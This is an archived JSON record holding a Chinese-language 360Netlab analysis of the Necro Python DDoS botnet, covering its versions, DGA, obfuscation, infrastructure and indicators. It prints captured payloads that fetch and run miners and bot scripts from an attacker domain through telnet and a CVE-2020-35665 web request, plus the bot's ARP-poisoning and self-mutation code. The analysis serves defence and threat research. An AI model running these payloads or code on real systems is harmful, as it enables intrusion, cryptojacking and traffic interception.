{
    "id": "2d2eddd2-1e78-46bb-8994-ef23844f00c6",
    "created_at": "2023-01-12T15:07:18.943401Z",
    "updated_at": "2025-03-27T02:10:04.376672Z",
    "deleted_at": null,
    "sha1_hash": "4843673bf6f712d1c3a99583cc6ca5b794ea3870",
    "title": "2021-01-21 - Necro在频繁升级，新版本开始使用PyInstaller和DGA",
    "authors": "",
    "file_creation_date": "2022-05-28T03:36:11Z",
    "file_modification_date": "2022-05-28T03:36:11Z",
    "file_size": 1253534,
    "plain_text": "# Necro在频繁升级，新版本开始使用PyInstaller和DGA\n\n**[blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/](https://blog.netlab.360.com/not-really-new-pyhton-ddos-bot-n3cr0m0rph-necromorph/)**\n\njinye January 21, 2021\n\n#### 21 January 2021 / DGA\n\n## 概述\n\n#### Necro是一个经典的Python编写的botnet家族，最早发现于2015年，早期针对Windows系统， 常被报为Python.IRCBot，作者自己则称之为N3Cr0m0rPh(Necromorph)。自2021年1月1号 起，360Netlab的BotMon系统持续检测到该家族的新变种，先后有3个版本的样本被检测到， 它们均针对Linux系统，并且最新的版本使用了DGA技术来生成C2域名对抗检测。本文将对最 近发现的Necro botnets做一分析。\n\n 本文的关键点如下：\n 1，Necro最新版的感染规模在万级，并且处于上升趋势。\n 2，在传播方式上，Necro支持多种方式，并且持续集成新公开的1-day漏洞，攻击能力较强。\n 3，最新版Necro使用了DGA技术生成C2域名，Python脚本也经过重度混淆以对抗静态分析。\n 4，目前传播的不同版本Necro botnet背后为同一伙人，并且主要针对Linux设备。\n 5，最新的2个版本为了确保能在没有Python2的受害机器上执行，会同时分发使用PyInstaller 打包过的Python程序。\n\n 在撰写本文时,我们注意到先后有2家安全厂商报道了Necro botnet及其团伙\n [PythonCryptoMinter][FreakOut]，但他们描述的均是已经停止传播的第2个版本，本文将描述 更多的关于Necro的内容。\n\n## 捕获\n\n#### Necro支持多种传播方式，其中2种被我们的Anglerfish蜜罐系统成功捕获到：一种是传统的 telnet弱口令爆破，另一种是1-day 漏洞(CVE-2020-35665)。捕获记录如下：\n\n 下面是实际捕获到的利用telnet弱口令传播第3版时的payload：\n\n\n-----\n\n```\nroot\npassword\nenable\nsystem\nshell\nsh\necho -e '\\x41\\x4b\\x34\\x37'\nwget http://aspjobjreorejborer.com/mirai.armexport ARGS=\"-o\naveixucyimxwcmph.xyz:9050\";LINE=\"killall -9 .sshd||pkill -9 .sshd_;[ ! -f\n/tmp/.pidfile ] && echo > /tmp/.pidfile;nohup .sshd $ARGS > /dev/null||nohup .sshd_\n$ARGS > /dev/null &\";grep -q \"$LINE\" ~/.bashrc||echo \"$LINE\" >> ~/.bashrc;curl\nhttp://aveixucyimxwcmph.xyz/xmrig1 -O||wget http://aveixucyimxwcmph.xyz/xmrig1 -O\n.sshd_;mv -f .sshd_ .sshd_;chmod 777 .sshd_;curl http://aveixucyimxwcmph.xyz/xmrig -O\nxmrig||wget http://aveixucyimxwcmph.xyz/xmrig -O xmrig;mv -f xmrig .sshd;chmod 777\n.sshd;chmod +x ~/.bashrc;~/.bashrc;cd /tmp||php -r \"file_put_contents(\".benchmark\",\nfile_get_contents(\"http://aveixucyimxwcmph.xyz/.benchmark\"));\";curl\nhttp://aveixucyimxwcmph.xyz/.benchmark -O;curl\nhttp://aveixucyimxwcmph.xyz/.benchmark.py -O;php -r\n\"file_put_contents(\".benchmark.py\",\nfile_get_contents(\"http://aveixucyimxwcmph.xyz/.benchmark.py\"));\";wget\nhttp://aveixucyimxwcmph.xyz/.benchmark -O .benchmark;wget\nhttp://aveixucyimxwcmph.xyz/.benchmark.py -O .benchmark.py;chmod 777\n.benchmark.py;chmod 777 .benchmark;python .benchmark.py||python2\n.benchmark.py||python2.7 .benchmark.py||./.benchmark||./.benchmark.py & \n\n#### 下面是实际捕获到的利用 1-day漏洞CVE-2020-35665传播第3版时的payload：\nGET /include/makecvs.php?Event=`export ARGS=\"-o aveixucyimxwcmph.xyz:9050\"\nLINE=\"killall -9 .sshd||pkill -9 .sshd_\n[ ! -f /tmp/.pidfile ] && echo > /tmp/.pidfile\nnohup .sshd $ARGS > /dev/null||nohup .sshd_ $ARGS > /dev/null &\"\ngrep -q \"$LINE\" ~/.bashrc||echo \"$LINE\" >> ~/.bashrc\ncurl http://aveixucyimxwcmph.xyz/xmrig1 -O||wget http://aveixucyimxwcmph.xyz/xmrig1 O .sshd_\nmv -f .sshd_ .sshd_\nchmod 777 .sshd_\ncurl http://aveixucyimxwcmph.xyz/xmrig -O xmrig||wget\nhttp://aveixucyimxwcmph.xyz/xmrig -O xmrig\nmv -f xmrig .sshd\nchmod 777 .sshd\nchmod +x ~/.bashrc\n~/.bashrc\ncd /tmp||php -r \"file_put_contents(\\\".benchmark\\\",\nfile_get_contents(\\\"http://aveixucyimxwcmph.xyz/.benchmark\\\"));\"\ncurl http://aveixucyimxwcmph.xyz/.benchmark -O\ncurl http://aveixucyimxwcmph.xyz/.benchmark.py -O\nphp -r \"file_put_contents(\\\".benchmark.py\\\",\nfile_get_contents(\\\"http://aveixucyimxwcmph.xyz/.benchmark.py\\\"));\"\nwget http://aveixucyimxwcmph.xyz/.benchmark -O .benchmark\nwget http://aveixucyimxwcmph.xyz/.benchmark.py -O .benchmark.py\n\n```\n\n-----\n\n#### 从上面的payload可以看到exp除了下载并执行原始的Python脚本（.benchmark.py），还会尝 试下载并执行PyInstaller打包后的ELF文件（.benchmark），这是作者自第2版开始引入的手 法，目的是为了提高执行成功率。因为Python 2已经到达EOL(end-of-life)，有些受害者机器上 缺乏这个运行环境，而使用Pyinstaller打包后的Python程序将成为独立的ELF，即使目标机器 上没有Python环境也可以正常执行。\n\n 值得说明的是漏洞CVE-2020-35665公开于2020年12月23日，距离我们首次捕获它的利用只 有8天，可见作者对新漏洞的使用非常“积极”。\n\n 另外，除了Necro样本，上面的exp还会下载挖矿程序xmrig和xmrig1，利用360netlab其它维度 的数据，我们发现同样的download server还曾用于mirai和一些Windows恶意exe程序的下 载，说明Necro的作者同时在运营多个家族的botnet：\n\n## 感染规模\n\n#### 根据360netlab的DNSMon数据我们对第2和第3版的2个C2域名解析情况做了统计，以此来评 估感染规模。根据下面的2个统计，我们能看到这两域名的unique客户端数均为2位数，考虑到 数据采集位置的区别，真实的流量大概是我们统计的500～700倍，所以它们实际的规模均应 该在万级。\n\n 下面是第2版C2域名的解析统计，能看到这个域名已经过了稳定期，处于下降状态。\n\n\n-----\n\n#### 下面是第3版域名的解析统计，能看到解析量在上升，说明这个版本还处于发展阶段。\n\n## 样本分析\n\n#### 通过分析，我们发现2021年捕获的Necro样本可以分为3个版本，每个版本之间在传播方式、 代码混淆和C2保存方面均有明显的区别，其中第1版 （necr0.py）到第2版（out.py）主要是 代码结构上的调整，混淆度有所增加。同时第2版开始采用PyInstaller方式把Python程序打包\n\n\n-----\n\n#### 成ELF。从第2版到第3版差别有所加大，不但代码混淆度显著增加，C2也从硬编码域名变成 了使用DGA算法。此外，在传播方式上第3版也增加了一些n-day漏洞。\n\n 第1版\n\n 因为第1版被作者命名为necro.py，所以我们把该家族命名为Necro。在代码混淆上，第1版只 是部分代码做了混淆处理：\n\n 它的C2信息只是简单编码保存，经过若干次逆向解码可以容易的得到：\n```\nirc server: '45.145.185.229'\nchannel: '#necro'\nkey: 'm0rph'\n\n 原始样本中可以发现可读的DDoS攻击相关的命令串：\n\n```\n\n-----\n\n#### 从这些命令串可以看出Necro是一个用于DDoS攻击的botnet，C2协议基于IRC，支持的攻击方 式既包括常见的udpflood、synflood、slowloris、httpflood这些，也包括在botnet中不常见的 amp反射攻击。\n\n 第2版\n\n 第2版（out.py）和第1版的混淆程度相当，但在漏洞利用上有变化，加入了Zend Framework (known as CVE-2021-3007)：\n\n 值得说明的是该漏洞2021年1月4日才曝光，这再次说明Necro的作者在利用新漏洞方面非 常“积极”。\n\n 在C2存放方面，第2版同样使用了简单编码保存：\n```\nirc server: 'gxbrowser.net'\nchannel: '#update'\nkey: 'N3Wm3W'\n\n```\n\n-----\n\n#### 第3版\n\n 第3版的被检测到用benchmark.py名称传播。相比前两个版本，第3版最大的变化是使用DGA 来生成C2域名，具体算法参考后面的DGA代码，下面是模拟该算法产生的部分域名:\n```\navEiXUcYimXwcMph.xyz\navEiXUcYimXwcMph.xyz\navEiXUcYimXwcMph.xyz\naoRmVwOaTOGgYqbk.xyz\naoRmVwOaTOGgYqbk.xyz\naoRmVwOaTOGgYqbk.xyz\nMasEdcNVYwedJwVd.xyz\nMasEdcNVYwedJwVd.xyz\nMasEdcNVYwedJwVd.xyz\nsuBYdZaoqwveKRlQ.xyz\n...\n\n 通过360netlab的DNSMon系统，我们看到该DGA算法产生的第1个域名 aveixucyimxwcmph.xyz已经启用，并且被用作下载服务器的域名。下面是该域名的详细信 息：\n2021-01-11 11:49:28 2021-01-20 03:47:28 372 aveixucyimxwcmph.xyz A\n193.239.147.224 \n2021-01-11 20:11:02 2021-01-11 20:11:03 2 aveixucyimxwcmph.xyz TXT\n\"v=spf1 include:spf.efwd.registrar-servers.com ~all\"\n2021-01-11 20:11:01 2021-01-11 20:11:03 3 aveixucyimxwcmph.xyz MX\neforward4.registrar-servers.com \n2021-01-11 20:11:01 2021-01-11 20:11:03 3 aveixucyimxwcmph.xyz MX\neforward5.registrar-servers.com \n2021-01-11 20:11:01 2021-01-11 20:11:03 3 aveixucyimxwcmph.xyz MX\neforward2.registrar-servers.com \n2021-01-11 20:11:01 2021-01-11 20:11:03 3 aveixucyimxwcmph.xyz MX\neforward1.registrar-servers.com \n2021-01-11 20:11:01 2021-01-11 20:11:03 3 aveixucyimxwcmph.xyz MX\neforward3.registrar-servers.com\n\n 2021年1月20号，在最新的第3版样本中作者又对DGA算法做了修改，将种子从3种修改为 4096种，同时开始使用SSL加密通信数据。\n\n 第3版的另一个变化是代码混淆的更严重了，不仅所有自定义对象全部被替换成随机字符，连 字符串也被用base64.encode(zlib.compress(plain_string))这种方式做了编码，导致样本中不 再有可读的、有意义的字符串，如下图所示：\n\n```\n\n-----\n\n#### 在传播方式上，第3版增加了更多的漏洞利用，这一点可以从解码后的字符串看出来：\n\n 在支持的DDoS攻击方法方面第3版没有变化，只是命令串被做了编码处理，解码后的DDoS命 令串如下：\n\n\n-----\n\n### 样本溯源\n\n#### 通过第1版样本的版本信息我们可以看到Necro早在2015年就已开发，作者称之为 N3Cr0m0rPh (Necromorph)。\n\n 利用这些信息，我们从样本库里关联到一批针对 Windows平台的早期Necro样本，都是exe文 件，这批样本刚好也可以追溯到2015年，跟第1版中的版本信息吻合。从这些线索可以推断 Necro首先针对的是Windows平台，然后也许是Python程序天然的跨平台特性，抑或现网大量 存在漏洞的Linux机器（IoT设备、云服务器等），启发Necro作者用去攻击Linux设备。无论如 何，现在Linux malware大军中又多了新的一员：Necro。\n\n## 其它\n\n\n-----\n\n#### 因为部分Necro样本以PyInstaller打包方式分发，下面简单介绍如何通过解包、反编译、解混 淆等手段还原出可读的.py脚本。\n\n 解包\n\n 以第3版为例，用开源工具pyinstxtractor解包从ELF样本中提取的pydata数据后可以得到原始 python脚本依赖的.so动态库、python库以及字节码文件.benchmark.pyc。\n\n 反编译pyc\n\n 利用uncompyle6反编译 .pyc字节码可以得到最终的python脚本。通过对比来自同一 downloader的python脚本 .benchmark.py ，发现其跟反编译出的.py脚本相同，所以断 定 .benchmark.py 就是打包前的原始脚本。\n\n 字符串解密\n\n Necro使用简单的“zip压缩+异或加密”方法隐藏字符串, 下面这段代码示范了解码过程：先解压 再异或即可得到被隐藏的字符串 '8.8.8.8' ：\n\n\n-----\n\n```\nxor_crypt(zlib.decompress(b \\x78\\x9c\\xab\\xac\\x8d\\x72\\xf7\\xca\\x96\\x06\\x00\\x0a\\xf1\\x02\\x\ndef xor_crypt(s):   \n  xor_key = [65, 83, 98, 105, 114, 69, 35, 64, 115, 103, 71, 103, 98, 52]  \n  return ('').join([ chr(ord(c) ^ xor_key[(i % len(xor_key))]) for i, c in\nenumerate(s) ]) \n\n#### 动态变形\n\n python脚本启动后会先调用 repack() 函数对当前的文件进行变形，变形的算法是依次从 obj_name_list表（表中保存了文件中自定义的对象名称）中取出一个对象名称(可能是类，变 量名，函数名)，然后产生一个8位的随机字串，用这个8位的随机字串替换文件中对应的对象 名称，结果就是原始文件中再也找不到可读的对象名称了。因为这种做法是不可逆的，我们只 能从代码功能上推测每个函数和变量的含义，参考早期版本的代码，我们基本搞楚了代码的功 能。\ndef __init__(self):\n  ...\n  self.repack() #repack bot before we install\n  self.install() #Install\ndef repack(self):\n  try:\n    fh_myself=open(argv[0],\"r\")\n    _pyload=fh_myself.read()\n    fh_myself.close()\n    obj_name_list=['localhost_irc','gen_random_8char'....]\n    for obj_name in obj_name_list:\n      _pyload=_pyload.replace(obj_name,self.gen_random_8char(8))\n    new_fh_myself=open(argv[0],\"w\")\n    new_fh_myself.write(_pyload)\n    new_fh_myself.close()\n  except:\n    pass\n\n ARP欺骗和流量嗅探\n\n 比较有意思的Necro还支持ARP投毒和网络流量嗅探。ARP欺骗是为了把受害者机器伪装成网 关，代码如下所示。\n\n```\n\n-----\n\n```\ndef create_pkt_arp_poison():\n  s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)\n  s.bind((\"wlan0\", 0))\n  while(1):\n    for lmfao in getPoisonIPs():\n      src_addr = get_src_mac()\n      dst_addr = lmfao[0]\n      src_ip_addr = get_default_gateway_linux()\n      dst_ip_addr = lmfao[1]\n      dst_mac_addr = \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n      payload = \"\\x00\\x01\\x08\\x00\\x06\\x04\\x00\\x02\"\n      checksum = \"\\x00\\x00\\x00\\x00\"\n      ethertype = \"\\x08\\x06\"\n      s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr\n        + dst_mac_addr + dst_ip_addr + checksum)\n    time.sleep(2)\n\n#### 这段buggy代码会在一个单独的线程种执行，每隔2秒读取一遍/proc/net/arp以获取最新的ARP 邻居，然后冒充网关给它们发送ARP回应，目的是使对方相信所运行的机器就是网关。作者这 么做可能是为了实现中间人劫持，但目前还没看到更多的中间人通信相关代码，猜测该功能尚 处于开发中。\n\n 嗅探主要针对受害者机器的TCP通信流量，该功能受C2指令（ .sniffer-resume ）控制。 一旦开启，所有非以下端口的TCP流量都会被记录并上报给C2的1337端口：“1337, 6667, 23, 443, 37215, 53, 22”。\n\n C2基础设施\n\n 从第3版的C2域名aveixucyimxwcmph.xyz出发，我们通过图系统成功的把3个版本的C2都关联 起来，如下图所示：\n\n```\n\n-----\n\n#### 其中，第2版的C2域名gxbrowser.net也曾解析到过第1版的C2 45.145.185.229上，而第3版的 C2域名aveixucyimxwcmph.xyz所解析的IP 193.239.147.224曾经也被gxbrowser.net使用过， 这些说明目前的3个版本Necro botnet背后的作者应该是同一伙人。\n\n 值得说明的是所有的Necro相关域名都已被360netlab的DNSmon系统拦截。\n\n## 结论\n\n#### Necro是一个相对较老的Python恶意程序，但作者通过采用代码混淆、PyInstaller打包、集成 DGA和新漏洞等方式使其摇身一变成为一款危害较大的针对Linux设备的新botnet，可谓“老树 新春”。考虑到作者在不到一个月的时间内接连推出了3个版本，我们相信该家族目前处于持续 活跃期中，相信后面还会不断发起新的攻击。360BotMon系统将持续对该家族保持关注，并会 即使公布新的威胁信息。\n\n 如果需要帮助，欢迎通过netlab@360.cn联系我们。\n\n## 版权声明\n\n#### 本文为Netlab Jinye原创，依据 CC BY-SA 4.0 许可证进行授权，转载请附上出处链接及本声 明。\n\n## IoC\n\n#### C2\n\n\n-----\n\n```\n45.145.185.83\n193.239.147.224\ngxbrowser.net\naveixucyimxwcmph.xyz\n\n#### Download URL\n# 第1版\n http://45.145.185.229/necr0.py\n# 第2版\n http://gxbrowser.net/out\n http://gxbrowser.net/out.py\n# 第3版\n http://aveixucyimxwcmph.xyz/.benchmark\n http://aveixucyimxwcmph.xyz/.benchmark.py\n\n```\n`#` 其它样本\n```\n http://gxbrowser.net/xmrig\n http://gxbrowser.net/xmrig1\n http://aveixucyimxwcmph.xyz/xmrig1\n http://45.145.185.229/bins/nginx.html/keksec.x86\n http://45.145.185.229/bins/nginx.html/keksec.spc\n http://45.145.185.229/bins/nginx.html/keksec.sh4\n http://45.145.185.229/bins/nginx.html/keksec.ppc\n http://45.145.185.229/bins/nginx.html/keksec.mpsl\n http://45.145.185.229/bins/nginx.html/keksec.mips\n http://45.145.185.229/bins/nginx.html/keksec.m68k\n http://45.145.185.229/bins/nginx.html/keksec.i586\n http://45.145.185.229/bins/nginx.html/keksec.arm\n http://45.145.185.229/bins/nginx.html/keksec.arm7\n http://45.145.185.229/bins/nginx.html/keksec.arm5\n http://45.145.185.229/bins/keksec.x88_64\n http://45.145.185.229/bins/keksec.x86\n http://45.145.185.229/bins/keksec.x64\n http://45.145.185.229/bins/keksec.spc\n http://45.145.185.229/bins/keksec.sh4\n http://45.145.185.229/bins/keksec.ppc\n http://45.145.185.229/bins/keksec.mpsl\n http://45.145.185.229/bins/keksec.mips\n http://45.145.185.229/bins/keksec.mips64\n http://45.145.185.229/bins/keksec.m68k\n http://45.145.185.229/bins/keksec.i586\n http://45.145.185.229/bins/keksec.arm\n http://45.145.185.229/bins/keksec.arm7\n http://45.145.185.229/bins/keksec.arm5\n http://45.145.185.229/update.sh\n\n## DGA 算法\n\n```\n\n-----\n\n```\nimport random\ndef gen_random_str(_range):\n  return\n('').join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')\nfor _ in range(_range))\ndef gen_cc(time):\n  random.seed(a=5236442 + time)\n  return gen_random_str(16) + '.xyz'\ndef gen_DGA():\n  i = 0\n  while 1:\n    for _ in range(3):\n      try:\n        print(gen_cc(i))\n      except:\n        pass\n    if i >= 2048:\n      i = 0\n    i += 1\ngen_DGA()\n\n## C2解密算法\nself.irc_server=b64decode(b64decode(\"3465343735353330346534343535333134653761353533303\n #Encoded irc server\nself.server_port=6667 #Server port\nself.channel=b64decode(b64decode(\"3465343436623761346436613464333134653664346433313466\n #Encoded channel\nself.channel_key==b64decode(b64decode(\"34653661343933313465343435313739346537613662333\n #Encoded channel key\n\n 引用\n\n```\n\n-----",
    "language": "ZH",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-21 - Necro在频繁升级，新版本开始使用PyInstaller和DGA.pdf"
    ],
    "report_names": [
        "2021-01-21 - Necro在频繁升级，新版本开始使用PyInstaller和DGA.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a270f6c-2c13-4abf-861e-7d44dcfa5ceb",
            "created_at": "2023-11-03T02:00:07.794425Z",
            "updated_at": "2025-03-27T02:00:03.146871Z",
            "deleted_at": null,
            "main_name": "Keksec",
            "aliases": [],
            "source_name": "MISPGALAXY:Keksec",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536038,
    "ts_updated_at": 1743041404,
    "ts_creation_date": 1653708971,
    "ts_modification_date": 1653708971,
    "files": {
        "pdf": "https://archive.orkl.eu/4843673bf6f712d1c3a99583cc6ca5b794ea3870.pdf",
        "text": "https://archive.orkl.eu/4843673bf6f712d1c3a99583cc6ca5b794ea3870.txt",
        "img": "https://archive.orkl.eu/4843673bf6f712d1c3a99583cc6ca5b794ea3870.jpg"
    }
}